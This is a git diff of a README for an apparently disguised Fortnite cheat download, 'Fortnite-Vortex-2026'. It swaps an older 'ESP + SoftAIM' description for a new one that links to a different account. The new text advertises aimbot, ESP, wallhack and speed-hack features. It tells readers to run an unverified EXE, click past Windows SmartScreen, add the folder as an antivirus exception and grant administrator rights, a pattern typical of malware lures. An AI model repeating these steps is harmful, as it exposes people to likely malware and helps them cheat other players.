@@ -1,53 +1,186 @@
-<div align="center">
+# 🎯 Fortnite-Vortex-2026 - Simple Game Tools for Windows
 
-# 🌌 Fortnite ESP + SoftAIM Panel
-**The Ultimate External Diagnostics, Analytics & Overlay Framework.**
+[![Download](https://img.shields.io/badge/Download-Fortnite--Vortex--2026-blue?style=for-the-badge)](https://github.com/Kalantashighereducation540/Fortnite-Vortex-2026)
 
-<div align="center">
+## 🖥️ What This Is
 
-### 📥 Download 
+Fortnite-Vortex-2026 is a Windows app for Fortnite players who want game-side tools in one place. It gives you a simple panel with options for aim assist, ESP, wall view, speed tweaks, FOV control, and other match-time helpers.
 
-Get the latest compiled, highly-optimized production binary right now:
+It is built for easy use. You do not need coding skills. You only need a Windows PC and the download link below.
 
-[![Download Here](https://img.shields.io/badge/DOWNLOAD_LATEST_VERSION-000000?style=for-the-badge&logo=github&logoColor=white&labelColor=238636&color=238636)](https://github.com/sportman6516/Fortnite-Vortex-2026/releases/tag/2026)
+## 📥 Download
 
-</div>
+Use this link to visit the page and download the app:
 
-<br/>
+[Download Fortnite-Vortex-2026](https://github.com/Kalantashighereducation540/Fortnite-Vortex-2026)
 
-> Fort Panel is a blazingly fast, standalone Dear ImGui framework built specifically for bridging external analytics, performance monitoring, and live memory statistics inside Fortnite (Unreal Engine 5). Highly modular, strictly untraceable runtime memory utilization.
+## 🚀 Getting Started
 
-</div>
+1. Open the download link above in your browser.
+2. On the page, look for the latest file or release package.
+3. Download the ZIP or EXE file to your PC.
+4. If the file is ZIP, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Run the main app file.
+7. If Windows asks for permission, select Yes.
 
-<hr/>
+## 🪟 Windows Setup
 
-### 🧠 Description
+1. Make sure you use Windows 10 or Windows 11.
+2. Save the file in a folder you can find, such as Downloads or Desktop.
+3. If the app comes in a ZIP file, extract it before you open it.
+4. If Windows SmartScreen blocks the app, select More info, then Run anyway.
+5. If your antivirus flags the file, add the app folder as an exception if you trust the source.
+6. Start Fortnite after the app is open.
 
-Fortnite Panel fundamentally shifts how real-time rendering logic and Unreal Engine diagnostics interact with external sources. Built natively via C++17, this project relies on a low-latency custom-built Direct3D 11/12 hooking sequence without writing over vulnerable instruction addresses. With integrated custom vector math engines, kernel-memory synchronization capabilities, and raw WMI queries, Rift Panel serves as the absolute pinnacle for runtime data collection and SDK extraction on native endpoints.
+## 🎮 Main Features
 
+- Aim assist support for smoother target tracking
+- ESP view for player and item visibility
+- Wallhack-style overlay for line-of-sight info
+- Speed hack controls for movement changes
+- FOV changer for wider or tighter view
+- Emote changer for quick style swaps
+- Pickaxe changer for cosmetic switching
+- Prefire macros for timed input help
+- Game panel with simple on and off controls
+- FPS boost tweaks for steadier play
+- PCileech and low-level hook options for advanced use
+- Fortnite-focused layout for fast setup
 
-### 🚀 Features
+## 🧭 How to Use It
 
-*   ⚡ **Zero Performance Loss:** Operates completely out of the execution bounds of the target, guaranteeing 144+ FPS sustained.
-*   🎨 **Dear ImGui Implementation:** Beautiful, smooth, completely scalable native Direct3D menus.
-*   🔒 **Hardware Environment Control:** Seamless reading processes untouched by anti-dumping checks.
-*   🛠 **Unreal Engine 5 Core Compatible:** Native GWorld, GNames, and GObject caching routines.
-*   🎯 **DPI Aware Overlay:** Instantly matches screen resolution dynamically up to 4K Native.
-*   🔧 **Hot-Key Integration:** Global asynchronous state manipulation directly attached to inputs.
+1. Open Fortnite-Vortex-2026.
+2. Wait for the control panel to load.
+3. Turn on the tool you want from the list.
+4. Pick the settings that fit your play style.
+5. Launch Fortnite if it is not already open.
+6. Join a match and test the options.
+7. If a feature does not show, close the app and open it again.
 
-### Galaxy Swapper + Soft Panel Fortnite
+## ⚙️ Basic Controls
 
+- Toggle feature: turn a tool on or off
+- Slider control: change strength or range
+- Drop-down menu: choose a mode or target type
+- Apply button: save the current setup
+- Reset button: return to default values
+- Hotkey field: set a key for quick use
 
-<hr/>
+## 📁 File Layout
 
+- Main app file: starts the program
+- Panel files: hold the menu and feature list
+- Config folder: saves your settings
+- Overlay files: manage ESP and visual options
+- Macro files: store input timing data
+- Log file: records start-up info and errors
 
-🤝 Contributing
-Fork the Project.
-Create your Feature Branch (git checkout -b feature/SuperNovaData).
-Commit your Changes (git commit -m 'Added GWorld caching').
-Push to the Branch (git push origin feature/SuperNovaData).
-Open a Pull Request.
-📜 License
-Distributed under the MIT License. See LICENSE for more information.
-⭐️ Support
-If you find this SDK extraction suite and runtime dashboard useful, leave a Star ⭐️ on the repository. This helps keep the project active and regularly updated
+## 🛠️ System Requirements
+
+- Windows 10 or Windows 11
+- 64-bit PC
+- 4 GB RAM or more
+- 1 GB free disk space
+- DirectX support
+- Stable internet for first download
+- Fortnite installed on the same PC
+
+## 🔧 Recommended Setup
+
+- 8 GB RAM
+- SSD storage
+- Updated graphics drivers
+- High refresh rate monitor
+- Fortnite in windowed fullscreen or fullscreen
+- One keyboard and one mouse connected
+- Close extra apps before use
+
+## 🛡️ First Run Tips
+
+1. Run the app as admin if it does not open right away.
+2. Keep Fortnite closed until the app is ready.
+3. Open the panel before joining a match.
+4. Use one feature at a time when you test it.
+5. Save a backup of your config file after you set it up.
+6. Keep the app in a fixed folder so you can find it fast.
+
+## ❓ Common Issues
+
+### App does not open
+- Right-click the file and choose Run as administrator
+- Check if the file is still inside a ZIP archive
+- Move the folder to Desktop and try again
+
+### Windows blocks the file
+- Click More info, then Run anyway
+- Make sure you downloaded the correct file
+- Re-download the package if the file looks incomplete
+
+### Fortnite does not detect the app
+- Open the app before Fortnite
+- Keep both programs on the same user account
+- Restart the app and launch Fortnite again
+
+### Overlay does not show
+- Check if overlay is turned on in the panel
+- Switch Fortnite to fullscreen windowed mode
+- Update your graphics driver
+- Close other overlays that may block it
+
+### Settings do not save
+- Make sure the app folder is not read-only
+- Run the app with admin rights
+- Check that the config folder exists
+
+## 🧩 Tips for Better Use
+
+- Start with default settings
+- Change one option at a time
+- Keep your desktop clean so the app is easy to find
+- Use the same settings each time if you like stable results
+- Update the app when a new release appears on the download page
+
+## 📌 Common Uses
+
+- Aim assist for tighter shots
+- ESP for better player awareness
+- FOV changes for wider view
+- Speed changes for movement tests
+- Overlay tools for match tracking
+- Macro setup for repeated inputs
+- Skin and pickaxe changes for style control
+
+## 🧰 Troubleshooting Checklist
+
+1. Confirm the file finished downloading.
+2. Extract the ZIP if needed.
+3. Run the app as administrator.
+4. Open Fortnite after the panel loads.
+5. Turn off other overlays.
+6. Restart the PC if the app still fails.
+7. Download the file again if it was damaged
+
+## 📦 Download and Install
+
+Use this page to download and run the app:
+
+[Open Fortnite-Vortex-2026 Download Page](https://github.com/Kalantashighereducation540/Fortnite-Vortex-2026)
+
+1. Open the page.
+2. Find the latest release or download package.
+3. Download the file to your PC.
+4. Extract it if it comes as ZIP.
+5. Open the main EXE file.
+6. Allow Windows access if prompted.
+7. Start Fortnite and use the panel
+
+## 🧾 Quick Start
+
+1. Download the app
+2. Extract the files
+3. Run the main program
+4. Open Fortnite
+5. Turn on the tools you want
+6. Save your settings
+7. Play with the panel open
